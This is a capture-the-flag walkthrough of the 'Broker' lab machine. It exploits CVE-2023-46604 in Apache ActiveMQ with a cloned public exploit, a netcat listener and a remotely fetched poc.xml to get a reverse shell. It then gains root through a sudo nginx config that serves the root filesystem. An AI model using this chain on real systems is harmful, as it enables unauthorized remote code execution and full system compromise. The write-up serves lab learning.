Broker is an easy difficulty Linux machine hosting a version of Apache ActiveMQ. Enumerating the version of Apache ActiveMQ shows that it is vulnerable to Unauthenticated Remote Code Execution, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a sudo misconfiguration allowing the activemq user to execute sudo /usr/sbin/nginx, which is similar to the recent Zimbra disclosure and is leveraged to gain root access.

CVE-2023-46604 Exploit
#

We searched for ActiveMQ 5.15.15 exploit CVE and found an interesting exploit:

CVE-2023-46604

we clone this exploit:

> git clone https://github.com/evkl1d/CVE-2023-46604
> cd CVE-2023-46604

We listen on port 6666:

nc -nlvp 6666

and we edit the poc.xml that contains the exploit folder that we cloned. The line you are going to edit needs your IP of the tun0 interface and the port you are listening on, to receive the shell there.

We create a server in python in which the exploit will take the poc.xml to attack the website.

We run the exploit as follows:

> python3 exploit.py -i 10.10.11.243 -u 'http://10.10.14.26/poc.xml'

In the -u parameter we put the Python Server that we made previously.

Did you understand what I did? I explain to you Basically, we copied an exploit from github, which is dedicated for this activeMQ Vulnerability.

In the exploit’s usage guide, it tells us that we need to create a python server which we will assign to it when we execute the attack, so that it loads the poc.xml file on the page with our IP and port on which we are already listening for receive our Revshell.

Nginx Sudo - Read root flag
#

sudo -l is used to check the privileges a user has on a Unix or Linux system via the sudo command.

Okay, We can run nginx with sudo privileges without a password, Let’s deep search how we can do that.

After search, i want now to create a configration file but first we need to see nginx.conf from this path /etc/nginx/nginx.conf.

I’ll edit this file from my machine and upload on the box.

user root;
worker_processes auto;
events {
       worker_connections 790;
}
http{
      server {
             listen   9000;
             location / {
                      root /;
             }
      
      }

}

To set configuration file use this command.

> sudo nginx -c /tmp/nginx1.conf
> ss -ltnp # displays TCP connections with a source port

Now we can access root flag.

curl http://localhost:9000/root/root.txt
